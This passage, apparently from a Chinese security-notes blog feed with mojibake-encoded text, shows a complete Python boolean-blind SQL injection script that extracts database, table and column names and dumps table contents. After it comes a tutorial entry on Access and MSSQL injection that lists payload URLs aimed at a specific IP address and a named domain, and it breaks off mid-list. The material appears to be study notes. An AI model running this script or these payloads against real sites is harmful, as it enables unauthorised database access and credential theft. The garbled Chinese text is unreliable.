% num</span><br><span class="line">        r = requests.get(db_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            db_length = num</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            num += 1</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, db_length + 1):</span><br><span class="line">        for j in ascii_list:</span><br><span class="line">            db_name_payload = url + &quot; and ord(mid((database()),%d,1))=%d --+&quot; % (i, ord(j))</span><br><span class="line">            # print(db_name_payload)</span><br><span class="line">            r = requests.get(db_name_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                db_name += j</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">    print(&quot;[+]æ•°æ®åº“åï¼š%s\n&quot; % db_name)</span><br><span class="line">    return db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># çˆ†ç ´è¡¨å</span><br><span class="line">def tb_name(url, str, ascii_list, db_name):</span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´è¡¨å&quot;)</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        tb_payload = url + &quot; and (select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d --+&quot; % (</span><br><span class="line">            db_name, i)</span><br><span class="line">        # print(tb_payload)</span><br><span class="line">        r = requests.get(tb_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            tb_number = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    j = 1</span><br><span class="line">    tb_name_length = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        while True:</span><br><span class="line">            tb_name_length_payload = url + &quot; and (select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % (</span><br><span class="line">                db_name, i, j)</span><br><span class="line">            # print(tb_name_length_payload)</span><br><span class="line">            r = requests.get(tb_name_length_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                tb_name_length.append(j)</span><br><span class="line">                j = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                j += 1</span><br><span class="line"></span><br><span class="line">    tb_name_list = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        tb_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, tb_name_length[i] + 1):</span><br><span class="line">            for k in ascii_list:</span><br><span class="line">                tb_name_payload = url + &quot; and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % (</span><br><span class="line">                    db_name, i, j, ord(k))</span><br><span class="line">                r = requests.get(tb_name_payload)</span><br><span class="line">                # print(tb_name_payload)</span><br><span class="line">                if str in r.text:</span><br><span class="line">                    tb_name += k</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    pass</span><br><span class="line">        tb_name_list.append(tb_name)</span><br><span class="line">    print(&quot;\n[+]%såº“ä¸‹çš„%då¼ è¡¨ä¸ºï¼š%s\n&quot; % (db_name, tb_number, tb_name_list))</span><br><span class="line">    return tb_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def column_name(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;è¯·è¾“å…¥ä½ é€‰æ‹©çš„è¡¨å(ä¾‹å¦‚ admin):&quot;)</span><br><span class="line">        if tb_name in tb_name_list:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;è¾“å…¥çš„è¡¨åæœ‰è¯¯,è¯·é‡æ–°è¾“å…¥&quot;)</span><br><span class="line"></span><br><span class="line">    j = 1</span><br><span class="line">    while True:</span><br><span class="line">        column_num_payload = url + &quot; and (select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d --+&quot; % (</span><br><span class="line">            tb_name, db_name, j)</span><br><span class="line">        # print(column_num_payload)</span><br><span class="line">        r = requests.get(column_num_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            column_num = j</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            j += 1</span><br><span class="line"></span><br><span class="line">    column_name_length = []</span><br><span class="line">    k = 1</span><br><span class="line">    for i in range(column_num):</span><br><span class="line">        while True:</span><br><span class="line">            column_name_length_payload = url + &quot; and (select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % (</span><br><span class="line">                tb_name, i, k)</span><br><span class="line">            # print(column_name_length_payload)</span><br><span class="line">            r = requests.get(column_name_length_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                column_name_length.append(k)</span><br><span class="line">                k = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                k += 1</span><br><span class="line"></span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´%sè¡¨çš„å­—æ®µå:&quot; % tb_name)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    for i in range(len(column_name_length)):</span><br><span class="line">        column_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, column_name_length[i] + 1):</span><br><span class="line">            for k in ascii_list:</span><br><span class="line">                column_name_payload = url + &quot; and ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % (</span><br><span class="line">                    tb_name, i, j, ord(k))</span><br><span class="line">                # print(column_name_payload)</span><br><span class="line">                r = requests.get(column_name_payload)</span><br><span class="line">                if str in r.text:</span><br><span class="line">                    column_name += k</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    pass</span><br><span class="line">        column_name_list.append(column_name)</span><br><span class="line">    print(&quot;[+]%sè¡¨çš„å­—æ®µååˆ†åˆ«ä¸º:%s&quot; % (tb_name, column_name_list))</span><br><span class="line">    return column_name_list, tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump_data(url, str, tb_name, db_name, column_name_list):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        data_num_payload = url + &quot; and (select count(*) from %s.%s)=%d --+&quot; % (db_name, tb_name, i)</span><br><span class="line">        # print(data_num_payload)</span><br><span class="line">        r = requests.get(data_num_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            data_num = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´%sæ•°æ®åº“çš„%sè¡¨ä¸­æ•°æ®:&quot; % (db_name, tb_name))</span><br><span class="line">    k = 1</span><br><span class="line">    data_length = []</span><br><span class="line">    dump_data_list = []</span><br><span class="line">    dump_data = &#x27;&#x27;</span><br><span class="line">    for i in column_name_list:</span><br><span class="line">        for j in range(data_num):</span><br><span class="line">            while True:</span><br><span class="line">                dump_data_length_payload = url + &quot; and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) --+&quot; % (</span><br><span class="line">                    i, db_name, tb_name, j, k)</span><br><span class="line">                # print(dump_data_length_payload)</span><br><span class="line">                r = requests.get(dump_data_length_payload)</span><br><span class="line">                if str not in r.text:</span><br><span class="line">                    dump_data_length = k - 1</span><br><span class="line">                    k = 1</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    k += 1</span><br><span class="line">            data_length.append(dump_data_length)</span><br><span class="line">            for l in range(1, dump_data_length + 1):</span><br><span class="line">                max = 127</span><br><span class="line">                min = 33</span><br><span class="line">                while abs(max - min) &gt; 1:</span><br><span class="line">                    midx = int((max + min) / 2)</span><br><span class="line">                    dump_data_payload = url + &quot; and ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d --+&quot; % (</span><br><span class="line">                        i, db_name, tb_name, j, l, midx)</span><br><span class="line">                    # print(dump_data_payload)</span><br><span class="line">                    r = requests.get(dump_data_payload)</span><br><span class="line">                    if str in r.text:</span><br><span class="line">                        min = midx</span><br><span class="line">                    else:</span><br><span class="line">                        max = midx</span><br><span class="line">                dump_data += chr(max)</span><br><span class="line">            dump_data_list.append(dump_data)</span><br><span class="line">            dump_data = &#x27;&#x27;</span><br><span class="line">            # print( dump_data_list)</span><br><span class="line">    print(&quot;[+]%sæ•°æ®åº“çš„%sè¡¨çš„æ•°æ®:&quot; % (db_name, tb_name))</span><br><span class="line">    j = 0</span><br><span class="line">    num_1 = len(dump_data_list) // data_num</span><br><span class="line">    for i in range(data_num):</span><br><span class="line">        j = i</span><br><span class="line">        for k in range(num_1):</span><br><span class="line">            print(&quot;%s\t\t&quot; % dump_data_list[j], end=&#x27;&#x27;)</span><br><span class="line">            j = i + data_num</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def re(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;å¦‚éœ€è·‘å…¶ä»–è¡¨,è¯·è¾“å…¥ä»»æ„å­—ç¬¦,å¦åˆ™è¾“å…¥No(ä¾‹å¦‚ admin):&quot;)</span><br><span class="line">        if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(tb_name_list)</span><br><span class="line">            column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">            dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;è¯·è¾“å…¥URL:&quot;)  # ç›®æ ‡url http://127.0.0.1/sqli/Less-5/?id=1</span><br><span class="line">str = input(&quot;è¯·è¾“å…¥æ­£ç¡®é¡µé¢è¿”å›å­—ç¬¦ä¸²:&quot;)  # å¸ƒå°”å‹ç›²æ³¨çš„true&amp;falseçš„åˆ¤æ–­å› ç´  You are in</span><br><span class="line">url = close(url)</span><br><span class="line">ascii_list = db_ascii_list()</span><br><span class="line">db_name = db_name(url, str, ascii_list)</span><br><span class="line">tb_name_list = tb_name(url, str, ascii_list, db_name)</span><br><span class="line">column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line">re(url, str, ascii_list, tb_name_list, db_name)</span><br></pre></td></tr></table></figure><h3 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/bc35f8dd4f7c</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/fcae21926e5c</span><br><span class="line"></span><br><span class="line">https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g æå–ç ï¼šl9f6</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15WEBæ¼æ´--SQLæ³¨å…¥ä¹‹Oracleã€MongoDBæ³¨å…¥</title>
      <link href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h3><p>Accessï¼Œmysqlï¼ŒmongoDBï¼Œpostsqlï¼Œsqliteï¼Œoracleï¼Œsybaseç­‰</p><p>mysql mssqlç­‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®åº“A</span><br><span class="line">è¡¨å</span><br><span class="line">åˆ—å</span><br><span class="line">æ•°æ®</span><br><span class="line">æ•°æ®åº“B</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><p>Access </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  è¡¨å</span><br><span class="line"></span><br><span class="line">   åˆ—å</span><br><span class="line"></span><br><span class="line">æ•°æ®</span><br></pre></td></tr></table></figure><p>  accessæ•°æ®åº“æ²¡æœ‰æ•°æ®åº“åï¼Œæ•°æ®åº“ä¼šä¿å­˜åœ¨ç½‘ç«™æºç ä¸‹é¢ï¼Œæ•°æ®åº“æ˜¯ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œè·¨åº“æ³¨å…¥ï¼Œaccessæ²¡æœ‰å‘å…¶ä»–æ•°æ®åº“ä¸€æ ·çš„åŠŸèƒ½ï¼Œæ²¡æœ‰æ–‡ä»¶è¯»å†™çš„åŠŸèƒ½ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104696.png" alt="image-20210827145602483"></p><h4 id="ä»€ä¹ˆå†³å®šç½‘ç«™æ³¨å…¥ç‚¹ç”¨æˆ·æƒé™ï¼Ÿ"><a href="#ä»€ä¹ˆå†³å®šç½‘ç«™æ³¨å…¥ç‚¹ç”¨æˆ·æƒé™ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆå†³å®šç½‘ç«™æ³¨å…¥ç‚¹ç”¨æˆ·æƒé™ï¼Ÿ"></a>ä»€ä¹ˆå†³å®šç½‘ç«™æ³¨å…¥ç‚¹ç”¨æˆ·æƒé™ï¼Ÿ</h4><p>æ•°æ®åº“é…ç½®æ–‡ä»¶çš„ç”¨æˆ·ï¼Œæ˜¯è°è¿æ¥çš„  </p><h3 id="ç®€è¦å­¦ä¹ å„ç§æ•°æ®åº“çš„æ³¨å…¥ç‰¹ç‚¹"><a href="#ç®€è¦å­¦ä¹ å„ç§æ•°æ®åº“çš„æ³¨å…¥ç‰¹ç‚¹" class="headerlink" title="ç®€è¦å­¦ä¹ å„ç§æ•°æ®åº“çš„æ³¨å…¥ç‰¹ç‚¹"></a>ç®€è¦å­¦ä¹ å„ç§æ•°æ®åº“çš„æ³¨å…¥ç‰¹ç‚¹</h3><p>æ•°æ®åº“æ¶æ„ç»„æˆï¼Œæ•°æ®åº“é«˜æƒé™æ“ä½œ</p><h3 id="Accessæ³¨å…¥"><a href="#Accessæ³¨å…¥" class="headerlink" title="Accessæ³¨å…¥"></a>Accessæ³¨å…¥</h3><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œaccessæ³¨å…¥éœ€è¦é€šè¿‡çŒœè§£è¡¨åå’Œå­—æ®µåå»æ³¨å…¥ã€‚</p><h4 id="åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ç‚¹"></a>åˆ¤æ–­æ³¨å…¥ç‚¹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47744/new_list.asp?id=1&#x27;#é¡µé¢æŠ¥é”™</span><br><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 and 1=1    #é¡µé¢æ­£å¸¸</span><br><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 and 1=2   #é¡µé¢æŠ¥é”™</span><br></pre></td></tr></table></figure><p>è¯´æ˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><h4 id="åˆ¤æ–­æ˜¯ä¸æ˜¯accessæ•°æ®åº“"><a href="#åˆ¤æ–­æ˜¯ä¸æ˜¯accessæ•°æ®åº“" class="headerlink" title="åˆ¤æ–­æ˜¯ä¸æ˜¯accessæ•°æ®åº“"></a>åˆ¤æ–­æ˜¯ä¸æ˜¯accessæ•°æ®åº“</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è‹¥å¸¦å…¥ and (<span class="function">select <span class="title">count</span><span class="params">(*)</span> from msysobjects)&gt;0 </span></span><br><span class="line"><span class="function">ç”±äºmsysobjectsè¡¨åœ¨accessæ•°æ®åº“ä¸­æ— æƒè®¿é—®æ‰€ä»¥è¿”å›é”™è¯¯--ä¸ºaccessæ•°æ®åº“</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºaccessæ•°æ®åº“æœ‰æ—¶å€™æ·»åŠ ä¸Šé¢çš„è¯­å¥å°±æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“æ˜¯ä¸æ˜¯accessæ•°æ®åº“ï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹æ®è„šæœ¬è¯­è¨€åˆ¤æ–­ å¦‚æœè¯­è¨€ä¸ºasp,åŸºæœ¬å°±æ˜¯accessæ•°æ®åº“ï¼Œaspxå¯èƒ½æ˜¯mssqlå¾ˆå°‘æ˜¯accessã€‚æ‰€ä»¥æˆ‘ä»¬è¦åˆ¤æ–­æ˜¯ä¸æ˜¯accessæ•°æ®åº“ã€‚åªéœ€è¦çœ‹æ˜¯ä¸æ˜¯asp è¯­è¨€ï¼Œå¦‚æœæ˜¯aspxå°±åˆ¤æ–­ä»–æ˜¯ä¸æ˜¯MSSQLæ•°æ®åº“å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#è‹¥å¸¦å…¥and (select count(*) from sysobjects)&gt;0 </span><br><span class="line">#ç”±äºsysobjectsè¡¨åœ¨MSSQLæ•°æ®åº“ä¸­å¯ä»¥æ­£å¸¸è®¿é—®æ‰€ä»¥å½“è¿”å›æ­£å¸¸é¡µé¢æ—¶è¡¨ç¤ºä¸ºMSSQLæ•°æ®åº“</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and (select count(*) from sysobjects)&gt;0    #é”™è¯¯è¡¨ç¤ºä¸æ˜¯mssql,è€Œæ˜¯accessã€æ•°æ®åº“</span><br></pre></td></tr></table></figure><h4 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h4><p>å¦‚æœæœ‰å›æ˜¾çš„è¯å¯ä»¥ç”¨è”åˆæ³¨å…¥,æ— å›æ˜¾å°±ç”¨ç›²æ³¨</p><p>order by è¯­å¥åˆ¤æ–­åˆ—æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 order by 4</span><br></pre></td></tr></table></figure><h5 id="çŒœè§£è¡¨å"><a href="#çŒœè§£è¡¨å" class="headerlink" title="çŒœè§£è¡¨å"></a>çŒœè§£è¡¨å</h5><p>å› ä¸ºæˆ‘ä»¬å·²ç»çŸ¥é“å­—æ®µæ•°äº†ï¼Œæ‰€ä»¥å‰©ä¸‹çš„å°±æ˜¯è¡¨åäº†ï¼Œè¿™ä¸ªéœ€è¦è‡ªå·±å»çŒœï¼Œæˆ–è€…ä½¿ç”¨å·¥å…·è·‘ï¼Œæ­£ç¡®å°±ä¼šè¿”å›å›æ˜¾çš„ä½ç½®ï¼Œé”™è¯¯å°±ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 union select 1,2,3,4 from admin(è‡ªå·±çŒœæµ‹çš„)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select * from admin) #åˆ¤æ–­æŸ¥è¯¢ç»“æœæ˜¯å¦å­˜åœ¨</span><br></pre></td></tr></table></figure><h5 id="çŒœè§£åˆ—å"><a href="#çŒœè§£åˆ—å" class="headerlink" title="çŒœè§£åˆ—å"></a>çŒœè§£åˆ—å</h5><p>ç„¶åå°±æ˜¯çŒœåˆ—åï¼Œä¸€é¡¿çŒœã€‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 union select 1,username,passwd,4 from admin(è‡ªå·±çŒœæµ‹çš„)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¿™æ ·çŒœï¼Œç›²æ³¨ä¸€èˆ¬ç”¨è¿™ä¸ªï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id from admin)   #é¡µé¢è¿”å›æ­£å¸¸è¡¨ç¤ºå­˜åœ¨</span><br><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id,username from admin)   #é¡µé¢è¿”å›æ­£å¸¸è¡¨ç¤ºå­˜åœ¨</span><br></pre></td></tr></table></figure><h4 id="åç§»æ³¨å…¥"><a href="#åç§»æ³¨å…¥" class="headerlink" title="åç§»æ³¨å…¥"></a>åç§»æ³¨å…¥</h4><p><strong>åç§»æ³¨å…¥ä¸»è¦æ˜¯é’ˆå¯¹çŸ¥é“è¡¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å­—æ®µçš„ã€‚</strong></p><p>è¿™é‡Œæˆ‘å·²ç»çŸ¥é“äº†è¡¨æ˜æ˜¯ï¼šsys_admin</p><p>å¯ä»¥ä½¿ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exists(selct * from sys_admin);</span><br></pre></td></tr></table></figure><p>æ¥çŒœæµ‹æ˜¯å¦æœ‰sys_adminè¡¨ï¼Œå¦‚æœè¯´å­˜åœ¨çš„è¯é¡µé¢å°±ä¼šæ˜¾ç¤ºæ­£å¸¸ã€‚</p><p><strong>00x1 åˆ¤æ–­å­—æ®µæ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/newslist.asp?id=688 order by 19 #é”™è¯¯</span><br><span class="line">http://www.test.com/newslist.asp?id=688 order by 18 #æ­£ç¡®</span><br></pre></td></tr></table></figure><p><strong>00x2 çˆ†å‡ºæ˜¾ç¤ºä½</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sys_admin</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105187.png" alt="image-20210827161837286" style="zoom:67%;" /> <p><strong>00x3 åˆ¤æ–­è¡¨å†…å­˜åœ¨çš„å­—æ®µæ•°</strong></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨â€œ<em>â€ä»£æ›¿adminè¡¨å†…å­˜åœ¨çš„å­—æ®µï¼Œç”±äºæ˜¯18ä¸ªå­—æ®µæ•°ï¼Œéœ€è¦é€æ­¥æµ‹è¯•ï¼Œç›´åˆ°è¿”å›æ­£å¸¸ã€‚è¿™é‡Œâ€</em>â€œä¹Ÿå¯ä»¥ä½¿ç”¨sys_admin.*ä»£æ›¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #é”™è¯¯</span><br><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin    #é”™è¯¯</span><br><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin      #é”™è¯¯</span><br><span class="line">ç›´åˆ°.........http://www.test.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #æ­£ç¡®</span><br></pre></td></tr></table></figure><p>18-11=7ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜sys_adminè¡¨æœ‰7ä¸ªå­—æ®µ</p><p><strong>åç§»æ³¨å…¥çš„åŸºæœ¬å…¬å¼ä¸º:</strong></p><p>â€‹      <strong>order by å‡ºçš„å­—æ®µæ•°å‡å»</strong><em><strong>å·çš„å­—æ®µæ•°</strong>ï¼Œç„¶è€Œå†ç”¨</em><em>order byçš„å­—æ®µæ•°å‡å»</em>*<strong>2å€åˆšæ‰å¾—å‡ºæ¥çš„ç­”æ¡ˆ</strong></p><p>ã€€ã€€ã€€ã€€ä¹Ÿå°±æ˜¯18-11=7</p><p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€18-7*2=4</p><p>å¾—åˆ°ç­”æ¡ˆç­‰äºï¼š4</p><p>ç„¶åä¾æ—§æ˜¯å¥—å…¬å¼çš„è¿‡ç¨‹ã€‚</p><p>è¿™é‡Œçš„idå¿…é¡»æ˜¯å­˜åœ¨çš„ã€‚ä¹Ÿæ˜¯å°±è¯´å¿…é¡»è¦çŸ¥é“ä¸€ä¸ªå­—æ®µï¼Œæ‰€ä»¥è¦é è¿æ°”ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">#è¿™é‡Œunion select 1,2,3,4ï¼šé¡¾åæ€ä¹‰å°±æ˜¯åˆšæ‰å¾—å‡ºæ¥çš„é•¿åº¦ã€‚</span><br><span class="line">#åé¢çš„æ˜¯sqlï¼Œå¯ä½œå…¬å¼ã€‚</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ä¾¿çˆ†å‡ºäº†è´¦å·å¯†ç ã€‚</p><p>ä½†æ˜¯æˆ‘æµ‹è¯•çš„è¿™ä¸ªç½‘ç«™ï¼Œç•¥å¾®æœ‰ç‚¹ç‰¹æ®Šã€‚å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105080.png" alt="image-20210827172708527"></p><h3 id="SQL-server-MSSQLæ³¨å…¥"><a href="#SQL-server-MSSQLæ³¨å…¥" class="headerlink" title="SQL server/MSSQLæ³¨å…¥"></a>SQL server/MSSQLæ³¨å…¥</h3><p><strong>â‘ </strong>åˆ¤æ–­æ•°æ®åº“ç±»å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--è¿”å›æ­£å¸¸ä¸ºmssqlï¼ˆä¹Ÿåsql serverï¼‰</span><br><span class="line">and exists (select count(*) from sysobjects)--æœ‰æ—¶ä¸Šé¢é‚£ä¸ªè¯­å¥ä¸è¡Œå°±è¯•è¯•è¿™ä¸ªå“ˆ</span><br></pre></td></tr></table></figure><p><strong>â‘¡</strong>åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=@@version--è¿™ä¸ªè¯­å¥è¦åœ¨æœ‰å›æ˜¾çš„æ¨¡å¼ä¸‹æ‰å¯ä»¥å“¦</span><br><span class="line">and substring((select  @@version),22,4)=&#x27;2008&#x27;--</span><br><span class="line">é€‚ç”¨äºæ— å›æ˜¾æ¨¡å¼ï¼Œåé¢çš„2008å°±æ˜¯æ•°æ®åº“ç‰ˆæœ¬ï¼Œè¿”å›æ­£å¸¸å°±æ˜¯2008çš„å¤åˆ¶ä»£ç ç¬¬ä¸€æ¡è¯­å¥æ‰§è¡Œæ•ˆæœå›¾ï¼ˆç±»ä¼¼ï¼‰ï¼šç¬¬äºŒæ¡è¯­å¥æ‰§è¡Œæ•ˆæœå›¾ï¼šï¼ˆå¦‚æœæ˜¯2008çš„è¯å°±è¿”å›æ­£å¸¸ï¼‰</span><br></pre></td></tr></table></figure><p><strong>â‘¢</strong>è·å–æ‰€æœ‰æ•°æ®åº“çš„ä¸ªæ•° 